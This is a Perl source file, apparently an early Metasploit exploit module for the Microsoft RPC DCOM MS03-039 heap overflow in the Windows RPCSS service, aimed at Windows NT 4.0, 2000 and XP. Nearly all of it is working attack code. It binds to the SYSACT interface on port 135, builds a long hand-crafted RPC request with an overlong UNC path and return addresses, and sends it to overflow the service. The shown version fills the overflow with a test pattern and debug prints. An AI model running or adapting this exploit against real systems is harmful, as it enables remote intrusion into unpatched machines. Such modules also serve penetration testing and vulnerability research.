package Msf::Exploit::msrpc_dcom_ms03_039;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Microsoft RPC DCOM MSO3-039',
     'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 135],
                },

    'Payload' => {
                 'Space'  => 998,  # size % 12 == 0
                 'BadChars'  => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
                 },
    
    'Description'  => qq{
        This module exploits a heap overflow in the RPCSS service, this vulnerability
        was originally found by the Last Stage of Delirium research group and has been
        widely exploited ever since. This module can exploit the English versions of 
        Windows NT 4.0 SP6, Windows 2000, and Windows XP, all in one request :)
    },
                
    'Refs'  =>   [  
                    #'http://www.osvdb.org/2100',
                    'http://www.microsoft.com/technet/security/bulletin/MS03-039.mspx'
                 ],
    'DefaultTarget' => 0,
    'Targets' => [ 
                    # Windows NT 4.0 SP6a (esp) 0x77f33723
                    # Windows 2000 writable address + jmp+0xe0                    
                    # Windows 2000 Universal (ebx) 0x0018759f
                    # Windows XP | XP SP0/SP1 (pop/pop/ret)
                   ['Windows NT SP6/2K/XP ALL', 0x77f33723, 0x7ffde0eb, 0x0018759f, 0x01001c59],
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
    my ($res, $rpc);

    my $s = Msf::Socket->new();
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("");
        $self->PrintLine("[*] Error: " . $s->GetError());
        return(0);
    }

    my $bind = Pex::DCERPC::Bind(Pex::DCERPC::UUID('SYSACT'), '0.0', Pex::DCERPC::DCEXFERSYNTAX(), '2');
    $s->Send($bind);
    $res = $s->Recv(60, 5);
    $rpc = Pex::DCERPC::DecodeResponse($res);
    
    if ($rpc->{'AckResult'} != 0) {
        $self->PrintLine("[*] Could not bind to SYSACT interface");
        return(0);
    }

    $self->PrintLine("[*] Connected to SYSACT with group ID 0x".sprintf("%x", $rpc->{'AssocGroup'}));

    
    my $stub =
    "\x05\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x32\x24\x58\xfd".
    "\xcc\x45\x64\x49\xb0\x70\xdd\xae\x74\x2c\x96\xd2\x60\x5e\x0d\x00".
    "\x01\x00\x00\x00\x00\x00\x00\x00\x70\x5e\x0d\x00\x02\x00\x00\x00".
    "\x7c\x5e\x0d\x00\x00\x00\x00\x00\x10\x00\x00\x00\x80\x96\xf1\xf1".
    "\x2a\x4d\xce\x11\xa6\x6a\x00\x20\xaf\x6e\x72\xf4\x0c\x00\x00\x00".
    "\x4d\x41\x52\x42\x01\x00\x00\x00\x00\x00\x00\x00\x0d\xf0\xad\xba".
    "\x00\x00\x00\x00\xa8\xf4\x0b\x00\x60\x03\x00\x00\x60\x03\x00\x00".
    "\x4d\x45\x4f\x57\x04\x00\x00\x00\xa2\x01\x00\x00\x00\x00\x00\x00".
    "\xc0\x00\x00\x00\x00\x00\x00\x46\x38\x03\x00\x00\x00\x00\x00\x00".
    "\xc0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x03\x00\x00".
    "\x28\x03\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\xc8\x00\x00\x00\x4d\x45\x4f\x57\x28\x03\x00\x00\xd8\x00\x00\x00".
    "\x00\x00\x00\x00\x02\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc4\x28\xcd\x00".
    "\x64\x29\xcd\x00\x00\x00\x00\x00\x07\x00\x00\x00\xb9\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xab\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xa5\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xa6\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xa4\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xad\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\xaa\x01\x00\x00".
    "\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46\x07\x00\x00\x00".
    "\x60\x00\x00\x00\x58\x00\x00\x00\x90\x00\x00\x00\x40\x00\x00\x00".
    "\x20\x00\x00\x00\x78\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00".
    "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x50\x00\x00\x00\x4f\xb6\x88\x20".
    "\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x01\x10\x08\x00\xcc\xcc\xcc\xcc\x48\x00\x00\x00\x07\x00\x66\x00".
    "\x06\x09\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46".
    "\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
    "\x00\x00\x00\x00\x78\x19\x0c\x00\x58\x00\x00\x00\x05\x00\x06\x00".
    "\x01\x00\x00\x00\x70\xd8\x98\x93\x98\x4f\xd2\x11\xa9\x3d\xbe\x57".
    "\xb2\x00\x00\x00\x32\x00\x31\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x80\x00\x00\x00\x0d\xf0\xad\xba\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x18\x43\x14\x00\x00\x00\x00\x00".
    "\x60\x00\x00\x00\x60\x00\x00\x00\x4d\x45\x4f\x57\x04\x00\x00\x00".
    "\xc0\x01\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46".
    "\x3b\x03\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46".
    "\x00\x00\x00\x00\x30\x00\x00\x00\x01\x00\x01\x00\x81\xc5\x17\x03".
    "\x80\x0e\xe9\x4a\x99\x99\xf1\x8a\x50\x6f\x7a\x85\x02\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x30\x00\x00\x00\x78\x00\x6e\x00\x00\x00\x00\x00\xd8\xda\x0d\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x20\x2f\x0c\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00".
    "\x46\x00\x58\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x10\x00\x00\x00\x30\x00\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xcc\xcc\xcc\xcc".
    "\x68\x00\x00\x00\x0e\x00\xff\xff\x68\x8b\x0b\x00\x02\x00\x00\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00";

    my $endpath =
    "\xcc\xcc\xcc\xcc\x20\x00\x00\x00\x30\x00\x2d\x00".
    "\x00\x00\x00\x00\x88\x2a\x0c\x00\x02\x00\x00\x00\x01\x00\x00\x00".
    "\x28\x8c\x0c\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";
    
    my $uncpath =  Pex::PatternCreate(1100);
    print "Offsets:".join(" ", Pex::PatternOffset($uncpath, 0x12345678))."\n";
    

    my $ps = (length($uncpath) / 2);
    my $begpath = pack('VVVV', $ps, 0, $ps, 0x005c005c);
    
    $stub .= $begpath . $uncpath . $endpath;
    
    print "stub: " . length($stub)."\n";
    foreach my $sz (104, 108, 156, 160, 184, 372) {     
        substr($stub, $sz, 4, pack('V', unpack('V',substr($stub, $sz))+1036-0xc+24));
    }

   


    # Exploit in a fairly clean manner...
    my $exploit = Pex::DCERPC::Request(4, $stub);
    $s->Send($exploit);
    $res = $s->Recv(-1, 5);
    $rpc = Pex::DCERPC::DecodeResponse($res);
    if ($rpc && $rpc->{'Type'} eq 'fault') {
        $self->PrintLine("[*] Call to RPC service failed with error ".sprintf("0x%.8x",$rpc->{'Status'}));
        $self->PrintLine("[*] This probably means that the system is patched");
        return(0);
    }
}

